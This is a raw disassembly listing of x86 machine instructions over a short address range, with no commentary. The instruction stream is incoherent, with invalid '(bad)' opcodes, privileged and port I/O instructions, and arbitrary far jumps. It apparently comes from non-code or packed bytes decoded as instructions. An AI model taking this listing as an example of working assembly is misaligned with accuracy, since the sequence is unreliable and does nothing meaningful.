  412822:	and    BYTE PTR [eax+0x7adb9552],al
  412828:	jmp    0x2b77:0x7fb36b63
  41282f:	mov    esi,0x82f64430
  412834:	sub    DWORD PTR [eax],ebp
  412836:	jle    0x412890
  412838:	inc    eax
  412839:	fs mov dh,0xde
  41283c:	pop    esp
  41283d:	ret    
  41283e:	xor    eax,0xcdf5360c
  412843:	stos   DWORD PTR es:[edi],eax
  412844:	push   esp
  412845:	mov    cs,ebp
  412847:	xchg   edx,eax
  412848:	sub    eax,0x53929486
  41284d:	mov    ah,0x85
  41284f:	dec    eax
  412850:	push   es
  412851:	imul   ecx,DWORD PTR [ebx+0x48],0x604e0cf1
  412858:	pop    esi
  412859:	dec    esp
  41285a:	push   0x5a
  41285c:	jl     0x41287a
  41285e:	stc    
  41285f:	xchg   ecx,eax
  412860:	push   eax
  412861:	sub    ah,BYTE PTR [edi+0x66b593f0]
  412867:	add    dl,BYTE PTR [esi+0x6d]
  41286a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41286b:	aaa    
  41286c:	xlat   BYTE PTR ds:[ebx]
  41286d:	scas   eax,DWORD PTR es:[edi]
  41286e:	push   ebp
  41286f:	xchg   ebx,eax
  412870:	scas   eax,DWORD PTR es:[edi]
  412871:	pop    ss
  412872:	icebp  
  412873:	dec    edi
  412874:	dec    esp
  412875:	loope  0x412852
  412877:	repz push es
  412879:	out    0x6f,al
  41287b:	xchg   bl,ah
  41287d:	fst    DWORD PTR [eax+ebp*2+0x29cd1f90]
  412884:	(bad)
  412887:	pmullw mm7,QWORD PTR [ecx+0x1c]
  41288b:	mov    ?,WORD PTR [ebx]
  41288d:	dec    ecx
  41288e:	mov    bh,0xff
  412890:	dec    ecx
  412891:	xchg   edx,eax
  412892:	mov    eax,ds
  412894:	mov    ds:0xffaa31db,al
  412899:	int3   
  41289a:	in     eax,dx
  41289b:	(bad)  
  41289c:	cld    
  41289d:	xor    al,0x19
  41289f:	jge    0x4128c4
  4128a1:	dec    edx
  4128a2:	pop    ebx
  4128a3:	sub    eax,DWORD PTR ds:0x91ce94b9
  4128a9:	int    0xfd
  4128ab:	push   ebx
  4128ac:	fisub  DWORD PTR [edx-0x5a]
  4128af:	cmp    al,BYTE PTR [edx-0x5f3e356e]
  4128b5:	iret   
  4128b6:	jl     0x4128ef
  4128b8:	mov    bl,0xb6
  4128ba:	data16 scas al,BYTE PTR es:[edi]
  4128bc:	inc    edi
  4128bd:	push   es
  4128be:	hlt    
  4128bf:	jmp    0xe6db6ef1
  4128c4:	fmul   DWORD PTR [ecx+0x16]
  4128c7:	lock mul DWORD PTR [edx+0x0]
  4128cb:	push   edx
  4128cc:	add    BYTE PTR [ecx],ah
  4128ce:	cdq    
  4128cf:	inc    eax
  4128d0:	mov    esp,gs
  4128d2:	push   ecx
  4128d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128d4:	sub    al,0xa2
  4128d6:	stos   BYTE PTR es:[edi],al
  4128d7:	mov    cl,0xe8
  4128d9:	fucomi st,st(1)
  4128db:	repz adc al,0x98
  4128de:	sub    al,BYTE PTR [edi]
  4128e0:	mov    dl,0x57
  4128e2:	mov    ebp,0xe95f2f57
  4128e7:	in     al,dx
  4128e8:	(bad)  [ebp+0x1bb4987a]
  4128ee:	shr    BYTE PTR [edx+0x12],cl
  4128f1:	es stos BYTE PTR es:[edi],al
  4128f3:	xor    eax,0xbd097660
  4128f8:	cmc    
  4128f9:	addr16 dec ecx
  4128fb:	lods   eax,DWORD PTR ds:[esi]
  4128fc:	cmc    
  4128fd:	(bad)  
  4128fe:	jg     0x4128a2
  412900:	sub    DWORD PTR [edi],0xffffff99
  412903:	fs cmp al,0x6
  412906:	sahf   
  412907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412908:	mov    cl,0x5
  41290a:	ins    DWORD PTR es:[edi],dx
  41290b:	jmp    0xb2fe:0xde49d95e
  412912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412913:	scas   eax,DWORD PTR es:[edi]
  412914:	pop    esp
  412915:	xchg   esp,eax
  412916:	mov    edx,0x4b6c8844
  41291b:	sbb    al,0xeb
  41291d:	in     eax,dx
  41291e:	xor    BYTE PTR [ecx+0x2061f07d],bh
  412924:	sub    dh,BYTE PTR [ecx-0x74]
  412927:	and    bl,ch
  412929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41292a:	mov    ds:0x8577cdd7,al
  41292f:	leave  
  412930:	mov    ds:0x1372cfa9,eax
  412935:	pop    ss
  412936:	stos   DWORD PTR es:[edi],eax
  412937:	pusha  
  412938:	int3   
  412939:	neg    DWORD PTR [esi+0x2b]
  41293c:	stos   BYTE PTR es:[edi],al
  41293d:	out    0x68,eax
  41293f:	fldcw  WORD PTR [edx+0xe]
  412942:	scas   eax,DWORD PTR es:[edi]
  412943:	mov    al,ds:0x606616b
  412948:	(bad)  
  412949:	add    edi,DWORD PTR [ecx+0x5ef29edb]
  41294f:	cmp    BYTE PTR [edx-0x65],bh
  412952:	cmp    al,0x70
  412954:	fwait
  412955:	sbb    eax,0xea6f52d8
  41295a:	popf   
  41295b:	call   0x57816560
  412960:	push   ebx
  412961:	dec    esp
  412962:	mov    edx,0x4f4592cd
  412967:	lahf   
  412968:	aad    0xb4
  41296a:	cld    
  41296b:	ja     0x41293f
  41296d:	jno    0x4129b5
  41296f:	pop    esp
  412970:	fist   DWORD PTR [ecx]
  412972:	lods   al,BYTE PTR ss:[esi]
  412974:	mov    ebp,DWORD PTR [eax]
  412976:	jle    0x4129d3
  412978:	hlt    
  412979:	dec    dh
  41297b:	inc    edi
  41297c:	(bad)
  41297f:	add    al,0x7a
  412981:	test   eax,0x6b8274e2
  412986:	(bad)  
  412987:	jmp    0x412934
  412989:	jbe    0x412956
  41298b:	mov    ah,BYTE PTR [ebx+0x5b]
  41298e:	push   0xffffffff
  412990:	stc    
  412991:	fwait
  412992:	push   eax
  412993:	or     DWORD PTR ds:0x8ba70f4a,0x8
  41299a:	fstp   QWORD PTR [ebx*1+0x5a8a1f95]
  4129a1:	int    0x81
  4129a3:	jo     0x412945
  4129a5:	xor    al,0x75
  4129a7:	pop    DWORD PTR [ebx+0x3a]
  4129aa:	xchg   BYTE PTR [esi-0x65],al
  4129ad:	pop    ebx
  4129ae:	pop    esp
  4129af:	pop    ss
  4129b0:	cwde   
  4129b1:	mov    eax,0x985845c7
  4129b6:	stc    
  4129b7:	adc    edx,DWORD PTR [ecx+0x1f]
  4129ba:	pop    esp
  4129bb:	outs   dx,DWORD PTR ds:[esi]
  4129bc:	cmp    BYTE PTR [ecx-0x7ccaed15],ch
  4129c2:	fst    DWORD PTR [ebx+ebx*1]
  4129c5:	jnp    0x412a24
  4129c7:	pop    es
  4129c8:	fwait
  4129c9:	sbb    edi,edx
  4129cb:	or     ecx,edx
  4129cd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4129cf:	fistp  WORD PTR [ecx-0x2501c593]
  4129d5:	std    
  4129d6:	cld    
  4129d7:	mov    ds:0xb98478de,eax
  4129dc:	dec    esi
  4129dd:	xor    dl,bl
  4129df:	sub    eax,0xea249d9f
  4129e4:	mov    ah,0x46
  4129e6:	retf   0xe176
  4129e9:	or     DWORD PTR [esi],ebx
  4129eb:	outs   dx,BYTE PTR ds:[esi]
  4129ec:	fisubr WORD PTR [ebp-0x26d21cfe]
  4129f2:	loope  0x4129bb
  4129f4:	dec    ecx
  4129f5:	lods   al,BYTE PTR ds:[esi]
  4129f6:	mov    al,0xc4
  4129f8:	jl     0x4129c4
  4129fa:	sbb    ebx,DWORD PTR [ecx+0x65]
  4129fd:	inc    esi
  4129fe:	or     edx,ebp
  412a00:	retf   0x55b9
  412a03:	pop    edx
  412a04:	xchg   ebp,eax
  412a05:	mov    bl,BYTE PTR [esi]
  412a07:	js     0x4129c8
  412a09:	sub    al,0x16
  412a0b:	repnz add esi,DWORD PTR [edi-0x53834bf]
  412a12:	cmp    ebp,esi
  412a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a15:	mov    esi,0x5ee4c0a1
  412a1a:	out    dx,eax
  412a1b:	in     al,0x71
  412a1d:	jecxz  0x412a1e
  412a1f:	push   eax
  412a20:	icebp  
  412a21:	lock pop ecx
  412a23:	lds    eax,FWORD PTR [edx+0x45]
  412a26:	add    BYTE PTR [edi-0x23],ch
  412a29:	lock mov edi,0x66c54135
  412a2f:	lods   al,BYTE PTR ds:[esi]
  412a30:	sub    cl,dl
  412a32:	ss xor eax,0x558fd8e4
  412a38:	in     eax,0x73
  412a3a:	sub    bh,BYTE PTR [ecx-0x6dcae93e]
  412a40:	pusha  
  412a41:	fcmovnb st,st(2)
  412a43:	push   0x2
  412a45:	jae    0x4129ca
  412a47:	repz hlt 
  412a49:	rol    DWORD PTR [ebp-0x5078edc2],cl
  412a4f:	popf   
  412a50:	push   ebx
  412a51:	add    eax,0xb5aa2307
  412a56:	jmp    0x9879:0xd6cd4da0
  412a5d:	in     al,dx
  412a5e:	shl    BYTE PTR [eax],cl
  412a60:	or     al,0xf3
  412a62:	mov    ds:0x9ecc461a,eax
  412a67:	mov    edi,0x9e30b674
  412a6c:	cld    
  412a6d:	lods   eax,DWORD PTR ds:[esi]
  412a6e:	and    eax,DWORD PTR [eax-0x4fc7d7c4]
  412a74:	cmp    esi,DWORD PTR [ebp-0x6f]
  412a77:	add    eax,0x4cc62cfe
  412a7c:	jno    0x412a52
  412a7e:	inc    esp
  412a7f:	cmp    ah,dh
  412a81:	popa   
  412a82:	sub    BYTE PTR [ebx+0x125d8ecf],dh
  412a88:	shl    dh,1
  412a8a:	cld    
  412a8b:	shl    DWORD PTR [ebx+ebp*4],0xa
  412a8f:	sub    DWORD PTR [ebp+0x4a2190fb],edx
  412a95:	fcmovbe st,st(7)
  412a97:	adc    bh,BYTE PTR [eax+eiz*8+0x5c]
  412a9b:	test   al,0xee
  412a9d:	daa    
  412a9e:	push   ds
  412a9f:	cmp    eax,0x5f4e5d83
  412aa4:	sbb    BYTE PTR [ecx],bh
  412aa6:	outs   dx,BYTE PTR ds:[esi]
  412aa7:	mov    ah,0x76
  412aa9:	xor    al,0x5d
  412aab:	imul   esi,esp,0x8
  412aae:	out    dx,al
  412aaf:	xor    eax,0xf0620bef
  412ab4:	lock retf 
  412ab6:	lahf   
  412ab7:	(bad)
  412aba:	int    0x73
  412abc:	das    
  412abd:	xor    BYTE PTR [ecx-0x64eb000e],dh
  412ac3:	inc    edx
  412ac4:	mov    ebp,0x9046be8
  412ac9:	jmp    0x412a93
  412acb:	popf   
  412acc:	xchg   esi,eax
  412acd:	arpl   WORD PTR [eax+0x25],sp
  412ad0:	pop    edi
  412ad1:	ins    DWORD PTR es:[edi],dx
  412ad2:	xchg   edx,eax
  412ad3:	sub    DWORD PTR [ecx+0x53f420f5],esi
  412ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ada:	and    DWORD PTR [ebp+0x73084fbb],0x67
  412ae1:	cli    
  412ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ae3:	shl    DWORD PTR [edi+eiz*1-0x5b],cl
  412ae7:	fsubr  DWORD PTR [esi+ecx*4]
  412aea:	push   ebx
  412aeb:	fsubr  DWORD PTR [eax+0x15d5dff3]
  412af1:	lods   eax,DWORD PTR ds:[esi]
  412af2:	mov    esi,0xd5afb673
  412af7:	fmul   QWORD PTR [ecx+0x7c]
  412afa:	cmp    bh,BYTE PTR [edi]
  412afc:	mov    al,ds:0x6bbecef5
  412b01:	dec    edx
  412b02:	inc    ebx
  412b03:	inc    esi
  412b04:	inc    edi
  412b05:	push   ss
  412b06:	mov    dh,0xc0
  412b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b09:	rcr    DWORD PTR [ebp+0x6a68f533],0x6c
  412b10:	or     al,0xc2
  412b12:	mov    ecx,0xada1e503
  412b17:	xchg   esi,eax
  412b18:	imul   esp,DWORD PTR [ecx+0x12],0xf7349c91
  412b1f:	jns    0x412b71
  412b21:	or     BYTE PTR [ebx],ch
  412b23:	stc    
  412b24:	mov    ecx,0xe95feea2
  412b29:	add    eax,0xf7d4c6b8
  412b2e:	mul    dh
  412b30:	imul   edi,DWORD PTR [ebx+0x2549386b],0x31
  412b37:	leave  
  412b38:	sub    al,al
  412b3a:	leave  
  412b3b:	pop    ss
  412b3c:	add    al,0xa6
  412b3e:	inc    esi
  412b3f:	dec    edi
  412b40:	jmp    0x967d:0xca2a8fbd
  412b47:	aas    
  412b48:	popa   
  412b49:	jle    0x412ae3
  412b4b:	shr    BYTE PTR [edi],1
  412b4d:	pop    ebx
  412b4e:	xchg   BYTE PTR [eax],al
  412b50:	fidiv  DWORD PTR [ebp+0x32f223ef]
  412b56:	xchg   esp,eax
  412b57:	loopne 0x412ba2
  412b59:	rcr    BYTE PTR [edx+0x4e],cl
  412b5c:	hlt    
  412b5d:	aas    
  412b5e:	inc    ecx
  412b5f:	and    ch,BYTE PTR [ebx]
  412b61:	dec    ecx
  412b62:	sbb    al,0x8e
  412b64:	or     bl,ch
  412b66:	push   cs
  412b67:	adc    dl,al
  412b69:	out    0xd8,eax
  412b6b:	clc    
  412b6c:	loopne 0x412b0c
  412b6e:	nop
  412b6f:	sbb    DWORD PTR [ecx+0x1e],esi
  412b72:	std    
  412b73:	inc    ebx
  412b74:	dec    edx
  412b75:	mov    BYTE PTR [ebp+ebx*4+0x70],0x4d
  412b7a:	cmp    al,bh
  412b7c:	xlat   BYTE PTR ds:[ebx]
  412b7d:	jne    0x412ba1
  412b7f:	mov    ds:0x1c57eac0,eax
  412b84:	imul   eax,DWORD PTR [ebx],0xffffffef
  412b87:	lods   al,BYTE PTR ds:[esi]
  412b88:	pop    edi
  412b89:	sar    BYTE PTR [eax],0x26
  412b8c:	scas   eax,DWORD PTR es:[edi]
  412b8d:	inc    edx
  412b8e:	sti    
  412b8f:	in     al,0x54
  412b91:	je     0x412bd1
  412b93:	dec    ecx
  412b94:	lods   eax,DWORD PTR ds:[esi]
  412b95:	dec    esi
  412b96:	aad    0xcc
  412b98:	je     0x412bb0
  412b9a:	clc    
  412b9b:	fcomp  QWORD PTR [eax+0x2c]
  412b9e:	and    esi,esp
  412ba0:	xor    BYTE PTR [edx-0x2ab1e692],cl
  412ba6:	gs dec ebx
  412ba8:	lods   eax,DWORD PTR ds:[esi]
  412ba9:	push   esp
  412baa:	rcr    BYTE PTR [eax-0x4d],1
  412bad:	cmp    DWORD PTR [eax+0x6e249f13],ecx
  412bb3:	inc    ebx
  412bb4:	sar    dl,cl
  412bb6:	cmp    al,0x94
  412bb8:	ret    
  412bb9:	push   eax
  412bba:	add    esp,DWORD PTR [esi+eiz*1-0x4acad159]
  412bc1:	ins    BYTE PTR es:[edi],dx
  412bc2:	fidiv  WORD PTR [eax+0x16]
  412bc5:	push   0x9
  412bc7:	sub    ebx,ebp
  412bc9:	aam    0x1a
  412bcb:	(bad)  
  412bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bce:	sbb    bh,ch
  412bd0:	inc    edx
  412bd1:	pusha  
  412bd2:	fnstenv [ecx+0x6f40ea55]
  412bd8:	pop    ebp
  412bd9:	arpl   WORD PTR [edi-0x16],ax
  412bdc:	jae    0x412bf9
  412bde:	adc    BYTE PTR [ecx],ch
  412be0:	pop    ds
  412be1:	es mov ch,0x2
  412be4:	jne    0x412ba4
  412be6:	aaa    
  412be7:	sbb    BYTE PTR [edi+0x64],dl
  412bea:	mov    edi,0xd2dfd27e
  412bef:	sbb    al,0x43
  412bf1:	(bad)  [esi+edi*2+0x41]
  412bf5:	mov    ds:0xfa043034,al
  412bfa:	fild   WORD PTR [esi+0x47]
  412bfd:	test   al,0xa8
  412bff:	(bad)  
  412c00:	sub    dh,dl
  412c02:	jno    0x412bf8
  412c04:	dec    ebp
  412c05:	push   ss
  412c06:	bound  ecx,QWORD PTR [edx]
  412c08:	sbb    BYTE PTR [ecx*2-0x272b40cf],dl
  412c0f:	data16 ins BYTE PTR es:[edi],dx
  412c11:	sahf   
  412c12:	xchg   WORD PTR [esp+eax*2],dx
  412c16:	dec    edi
  412c17:	push   edi
  412c18:	sahf   
  412c19:	and    bl,bh
  412c1b:	pop    esi
  412c1c:	daa    
  412c1d:	out    dx,al
  412c1e:	in     al,dx
  412c1f:	mov    esi,0x8c9e9203
  412c24:	cmc    
  412c25:	sbb    eax,0x80dd76ff
  412c2a:	inc    esi
  412c2b:	dec    ecx
  412c2c:	into   
  412c2d:	adc    BYTE PTR [edi-0x44af8cdd],ah
  412c33:	je     0x412bfb
  412c35:	mov    ebp,0xabd444fe
  412c3a:	outs   dx,BYTE PTR ds:[esi]
  412c3b:	outs   dx,DWORD PTR ds:[esi]
  412c3c:	pop    ebp
  412c3d:	jo     0x412cad
  412c3f:	push   esi
  412c40:	mov    edx,0x5b968d82
  412c45:	and    DWORD PTR [edx+edi*2-0x16],ecx
  412c49:	daa    
  412c4a:	call   0x816a:0xcf427c92
  412c51:	cmp    ecx,esp
  412c53:	outs   dx,BYTE PTR ds:[esi]
  412c54:	xchg   DWORD PTR [ebp+ebp*2+0x1d],esp
  412c58:	sub    DWORD PTR [edi],eax
  412c5a:	stc    
  412c5b:	ss xor eax,0xead1b985
  412c61:	mov    ebx,0xd3ef0368
  412c66:	mov    ebp,0x4303f3b7
  412c6b:	or     eax,0xd24b2dc9
  412c70:	jp     0x412bf4
  412c72:	ins    BYTE PTR es:[edi],dx
  412c73:	add    eax,0xabb1a29d
  412c78:	daa    
  412c79:	leave  
  412c7a:	cwde   
  412c7b:	or     BYTE PTR es:[esi-0x77],0x23
  412c80:	sub    BYTE PTR [ebp+edi*2-0x28870e79],bh
  412c87:	push   es
  412c88:	push   ecx
  412c89:	loope  0x412ca4
  412c8b:	xor    eax,0x68004b9a
  412c90:	fisttp DWORD PTR [eax+ecx*8+0x45]
  412c94:	cld    
  412c95:	mov    bh,0xa3
	...
  412d13:	add    ah,dl
  412d15:	(bad)  
  412d16:	in     eax,dx
  412d17:	jp     0x412d08
  412d19:	jp     0x412cf2
  412d1b:	(bad)  
  412d1c:	jnp    0x412d5a
  412d1e:	adc    ecx,DWORD PTR [esi+0x50]
  412d21:	push   esi
  412d22:	call   0x6b00:0xd56e90
  412d29:	pop    es
  412d2a:	add    BYTE PTR [eax],al
  412d2c:	xor    eax,0x46f144ee
  412d31:	push   eax
  412d32:	cmp    DWORD PTR [eax],ecx
  412d34:	jbe    0x412d01
  412d36:	fwait
  412d37:	sub    al,0xcb
  412d39:	inc    eax
  412d3a:	dec    edx
  412d3b:	push   eax
  412d3c:	retf   
  412d3d:	mov    dl,0x6b
  412d3f:	pop    esp
  412d40:	cmp    BYTE PTR [ebp+0x5b],bh
  412d43:	dec    BYTE PTR [eax+0x4]
  412d46:	and    eax,0x96e8751d
  412d4b:	jns    0x412da9
  412d4d:	adc    BYTE PTR [eax-0x7c080c40],dl
  412d53:	dec    eax
  412d55:	dec    ecx
  412d56:	mov    bh,0x99
  412d58:	in     eax,dx
  412d59:	mov    eax,0xac5eaf03
  412d5e:	fdiv   st(6),st
  412d60:	push   ebp
  412d61:	adc    eax,0xa9d2394b
  412d66:	jno    0x412d0a
  412d68:	popa   
  412d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d6a:	jmp    0x3cea:0x83512db1
  412d71:	xchg   edi,eax
  412d72:	retf   0xa3f7
  412d75:	mov    ds:0xa7f1299f,al
  412d7a:	ins    BYTE PTR es:[edi],dx
  412d7b:	or     BYTE PTR [edi+0x6c],ch
  412d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d7f:	xor    eax,0xf4f9883d
  412d84:	inc    edx
  412d85:	mov    DWORD PTR [ebx],edi
  412d87:	dec    ecx
  412d88:	sub    bh,BYTE PTR [edx+0x179f9e59]
  412d8e:	pop    esp
  412d8f:	scas   eax,DWORD PTR es:[edi]
  412d90:	jmp    0x412df5
  412d92:	ret    0x3c49
  412d95:	add    eax,0xfa3768ee
  412d9a:	int    0x1a
  412d9c:	inc    ecx
  412d9d:	cli    
  412d9e:	sbb    esi,DWORD PTR [ebx+ebx*1]
  412da1:	jmp    0x5ec0d830
  412da6:	sar    dh,0xb5
  412da9:	jl     0x412d5d
  412dab:	test   DWORD PTR [ebx+0x5c],ecx
  412dae:	loopne 0x412d39
  412db0:	pop    ecx
  412db1:	xchg   esp,eax
  412db2:	daa    
  412db3:	nop
  412db4:	fld    TBYTE PTR [edx-0x325ca5d0]
  412dba:	mov    BYTE PTR [eax-0xddfd6],dl
  412dc0:	arpl   WORD PTR [eax-0x21653bd0],sp
  412dc6:	arpl   bp,cx
  412dc8:	sbb    DWORD PTR ds:0xc842b976,ecx
  412dce:	jg     0x412dea
  412dd0:	mov    esi,edi
  412dd2:	push   edi
  412dd3:	xchg   ebp,eax
  412dd4:	push   edx
  412dd5:	jo     0x412dce
  412dd7:	cmp    eax,DWORD PTR [edi-0x50e9daa0]
  412ddd:	pop    ebx
  412dde:	xchg   BYTE PTR cs:[esi-0x54],bh
  412de2:	pop    ebp
  412de3:	mov    ch,al
  412de5:	cwde   
  412de6:	retf   
  412de7:	push   ebp
  412de8:	push   ebx
  412de9:	and    BYTE PTR [eax-0x70361683],dh
  412def:	pop    ss
  412df0:	pop    ebp
  412df1:	fisttp WORD PTR [edi+0x31b05824]
  412df7:	cmp    DWORD PTR [edi+0x7020c496],edi
  412dfd:	ds (bad) 
  412dff:	in     al,dx
  412e00:	mov    BYTE PTR [ebp-0x6e],al
  412e03:	adc    bl,BYTE PTR [esi-0x29f756ad]
  412e09:	aaa    
  412e0a:	popf   
  412e0b:	sub    bl,BYTE PTR [edx+ebp*2]
  412e0e:	and    al,0x6c
  412e10:	dec    esp
  412e11:	sbb    ecx,DWORD PTR [ebp-0x46]
  412e14:	sbb    dl,0xe6
  412e17:	push   eax
  412e18:	mov    edi,0xc1b44b18
  412e1d:	pop    es
  412e1e:	dec    eax
  412e1f:	mov    ecx,0x8154126c
  412e24:	loopne 0x412dd8
  412e26:	popa   
  412e27:	mov    ebx,0xb60ee462
  412e2c:	cs push esp
  412e2e:	mov    ds:0x3a38c956,eax
  412e33:	enter  0x80a6,0x23
  412e37:	jmp    0x6705:0xc4c1034d
  412e3e:	push   esi
  412e3f:	loope  0x412ea8
  412e41:	add    al,0x6e
  412e43:	hlt    
  412e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e45:	dec    ecx
  412e46:	adc    BYTE PTR [ecx-0x65],ch
  412e49:	pop    ebx
  412e4a:	mov    al,ds:0xf037dbbf
  412e4f:	out    0xf8,eax
  412e51:	mov    ds:0x9d6244af,al
  412e56:	aam    0x2a
  412e58:	xchg   esp,eax
  412e59:	btr    edx,ebp
  412e5c:	(bad)  
  412e5d:	jl     0x412e27
  412e5f:	mov    eax,0x9bd8cc05
  412e64:	lahf   
  412e65:	pop    ss
  412e66:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  412e68:	jp     0x412e17
  412e6a:	fsubr  DWORD PTR [edi+0x2e3ceddb]
  412e70:	adc    DWORD PTR [eax+0x4d994d90],ebx
  412e76:	jecxz  0x412ee0
  412e78:	mov    al,ds:0x928eaee0
  412e7d:	xor    eax,DWORD PTR [ebx+0x1654d9c1]
  412e83:	push   edi
  412e84:	bound  ebp,QWORD PTR [ebx-0x48]
  412e87:	pushf  
  412e88:	push   eax
  412e89:	cmp    edx,DWORD PTR [edx-0x6c2202e1]
  412e8f:	sar    BYTE PTR [esi*8-0x56bd5084],0x30
  412e97:	sbb    BYTE PTR [ebp+ebp*8+0x305dc081],0x6f
  412e9f:	add    dl,al
  412ea1:	ret    
  412ea2:	int3   
  412ea3:	sbb    al,0x4a
  412ea5:	mov    esi,0x28e888e4
  412eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eab:	imul   esi,DWORD PTR gs:[eax-0x3],0x553bcd5f
  412eb3:	inc    esi
  412eb4:	out    dx,eax
  412eb5:	daa    
  412eb6:	sahf   
  412eb7:	fstp   QWORD PTR [ecx+0x17]
  412eba:	fnstcw WORD PTR [edx+0x1b34d98e]
  412ec0:	arpl   WORD PTR [eax-0x9],dx
  412ec3:	mov    edi,0x42e40b68
  412ec8:	xchg   ebx,eax
  412ec9:	sbb    BYTE PTR [ebx],dh
  412ecb:	pop    ds
  412ecc:	hlt    
  412ecd:	aaa    
  412ece:	mov    cs,WORD PTR [esi]
  412ed0:	pop    edi
  412ed1:	aad    0x56
  412ed3:	mov    al,0x40
  412ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ed6:	sbb    al,0xf2
  412ed8:	pop    ss
  412ed9:	jp     0x412f46
  412edb:	jge    0x412ec8
  412edd:	push   esp
  412ede:	fnstcw WORD PTR [esi]
  412ee0:	mov    dh,0x75
  412ee2:	mov    cl,0xdd
  412ee4:	and    al,BYTE PTR [edx-0xb07a76a]
  412eea:	and    al,ah
  412eec:	jle    0x412f3a
  412eee:	cmp    DWORD PTR [ebp-0x33],0x2a
  412ef2:	inc    esp
  412ef3:	jne    0x412eea
  412ef5:	xchg   esi,eax
  412ef6:	push   ebp
  412ef7:	inc    esp
  412ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef9:	cld    
  412efa:	hlt    
  412efb:	call   0x85edf546
  412f00:	mov    ds:0x86a2a5e,al
  412f05:	cmp    al,0x33
  412f07:	popa   
  412f08:	loop   0x412eff
  412f0a:	pop    ebp
  412f0b:	ja     0x412ec1
  412f0d:	add    eax,0xab0a5b79
  412f12:	stc    
  412f13:	mov    dh,0xe6
  412f15:	mov    al,ds:0xc5d25803
  412f1a:	push   edx
  412f1b:	push   ecx
  412f1c:	xchg   esp,ecx
  412f1e:	popf   
  412f1f:	test   eax,0x9a1d5929
  412f24:	mov    BYTE PTR [esi+0x24e51f31],ch
  412f2a:	aas    
  412f2b:	ins    DWORD PTR es:[edi],dx
  412f2c:	scas   al,BYTE PTR es:[edi]
  412f2d:	das    
  412f2e:	xchg   edx,eax
  412f2f:	mov    al,ds:0x99c4ac02
  412f34:	lds    eax,FWORD PTR [edi+0x3a]
  412f37:	push   0x33
  412f39:	pop    eax
  412f3a:	xor    cl,ch
  412f3c:	sub    eax,0xfad1f496
  412f41:	dec    eax
  412f42:	and    DWORD PTR [edi+0x78],esp
  412f45:	repz fadd QWORD PTR [ecx+0x2a9d117d]
  412f4c:	fsubr  QWORD PTR [ebp+0x5d]
  412f4f:	mov    WORD PTR [ecx+eax*1-0xfec5d0d],?
  412f56:	rcr    DWORD PTR [edi-0x80],0xa4
  412f5a:	sub    ecx,DWORD PTR [edi]
  412f5c:	sub    eax,0xde26da2b
  412f61:	xchg   ecx,eax
  412f62:	ficom  DWORD PTR ds:[eax]
  412f65:	push   ecx
  412f66:	imul   eax,DWORD PTR [edx],0x3f
  412f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f6a:	(bad)  
  412f6b:	mov    eax,0x39bf8ef7
  412f70:	ret    
  412f71:	test   BYTE PTR [ebp-0x44014f33],0x8a
  412f78:	push   ds
  412f79:	fisttp WORD PTR [edi-0x40]
  412f7c:	iret   
  412f7d:	ins    BYTE PTR es:[edi],dx
  412f7e:	aam    0x10
  412f80:	imul   esi,DWORD PTR [ecx+0x10b3802b],0x6f
  412f87:	or     al,0xfe
  412f89:	or     esp,eax
  412f8b:	leave  
  412f8c:	jmp    0x412f3f
  412f8e:	xchg   edx,eax
  412f8f:	lahf   
  412f90:	sub    DWORD PTR [edi+ebx*2-0xf09826d],0xf87e06b4
  412f9b:	dec    eax
  412f9c:	cmp    bl,al
  412f9e:	idiv   DWORD PTR [esi-0x1d96d6d7]
  412fa4:	xlat   BYTE PTR ds:[ebx]
  412fa5:	js     0x413025
  412fa7:	jmp    DWORD PTR [ebp+0x682cadfe]
  412fad:	jp     0x412f81
  412faf:	pop    edx
  412fb0:	cli    
  412fb1:	mov    DWORD PTR [esi-0x6c],edi
  412fb4:	jp     0x412f43
  412fb6:	fdiv   QWORD PTR [edi+0x8285ea0]
  412fbc:	retf   0x3c58
  412fbf:	(bad)  
  412fc0:	dec    edx
  412fc1:	push   cs
  412fc2:	jno    0x412ff7
  412fc4:	sahf   
  412fc5:	adc    ebx,DWORD PTR [edx-0x2b]
  412fc8:	in     al,0x8e
  412fca:	mov    esi,0xef3ff93f
  412fcf:	jns    0x412fc5
  412fd1:	outs   dx,DWORD PTR ds:[esi]
  412fd2:	retf   0xa4e7
  412fd5:	scas   eax,DWORD PTR es:[edi]
  412fd6:	jge    0x41302b
  412fd8:	push   ss
  412fd9:	and    ebx,DWORD PTR [edi]
  412fdb:	xlat   BYTE PTR ds:[ebx]
  412fdc:	cli    
  412fdd:	in     al,0xf9
  412fdf:	xor    eax,0x6659aa6e
  412fe4:	mov    bh,0x74
  412fe6:	ins    DWORD PTR es:[edi],dx
  412fe7:	sbb    al,dl
  412fe9:	cmp    ebp,ebx
  412feb:	cs pop ebx
  412fed:	jbe    0x412f74
  412fef:	inc    edx
  412ff0:	push   ds
  412ff1:	test   esp,0x109eff61
  412ff7:	call   0x9642605f
  412ffc:	adc    bh,BYTE PTR [ebp+edx*4-0x57]
  413000:	fwait
  413001:	xor    dh,dl
  413003:	sbb    dh,0xb2
  413006:	mov    eax,ds:0xf6fe668e
  41300b:	sub    DWORD PTR [ebx+0xdd53ac7],0x64041898
  413015:	inc    edx
  413016:	outs   dx,DWORD PTR ds:[esi]
  413017:	das    
  413018:	push   ebp
  413019:	pushf  
  41301a:	or     ebx,DWORD PTR [eax+0x44]
